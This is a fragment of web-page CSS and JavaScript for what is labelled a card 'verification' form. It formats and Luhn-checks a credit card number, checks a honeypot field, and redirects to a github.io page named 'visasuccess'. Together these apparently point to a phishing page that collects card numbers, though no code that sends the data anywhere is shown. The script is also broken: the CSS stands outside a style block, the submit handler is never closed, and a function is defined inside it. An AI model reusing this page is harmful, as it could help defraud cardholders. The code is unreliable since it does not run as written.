		  .spinner-overlay {
      position: absolute;
      inset: 0;
      background: rgba(255, 255, 255, 0.8);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 2;
    }

    .spinner {
      width: 40px;
      height: 40px;
      border: 5px solid #ccc;
      border-top: 5px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    /* Show loader after submit button is clicked on valid form */
    form:has(input:valid) button:focus + .spinner-overlay {
      display: flex;
    }

    @keyframes spin {
      0%   { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    <script>
      // Format card number input with spaces every 4 digits
    document.getElementById('card-number').addEventListener('input', function (e) {
      let value = e.target.value.replace(/\D/g, '').substring(0, 16); // only digits, max 16
      const parts = [];

      for (let i = 0; i < value.length; i += 4) {
        parts.push(value.substring(i, i + 4));
      }

      e.target.value = parts.join(' ');
    });

    // Luhn Algorithm to validate card number
    function isValidCardNumber(number) {
      const digits = number.replace(/\D/g, '');
      let sum = 0;
      let shouldDouble = false;

      for (let i = digits.length - 1; i >= 0; i--) {
        let digit = parseInt(digits.charAt(i), 10);
        if (shouldDouble) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
      }

      return (sum % 10) === 0;
    }

    // Form validation
    document.getElementById('verificationForm').addEventListener('submit', function (e) {
      const cardInput = document.getElementById('card-number');
      const cardNumber = cardInput.value;

      if (!isValidCardNumber(cardNumber)) {
        e.preventDefault();
        alert('Invalid credit card number. Please check and try again.');
        cardInput.focus();
        return false;
      }

      // Optional: validate honeypot for spam prevention
      const honeypot = document.getElementById('honeypot');
      if (honeypot.value.trim() !== "") {
        e.preventDefault(); // silent fail on bot
        return false;
      }

      // All validations passed
      return true;

		  function openInSameTab() {
      window.location.href = "https://lindex14.github.io/visasuccess/";
    }
    </script>
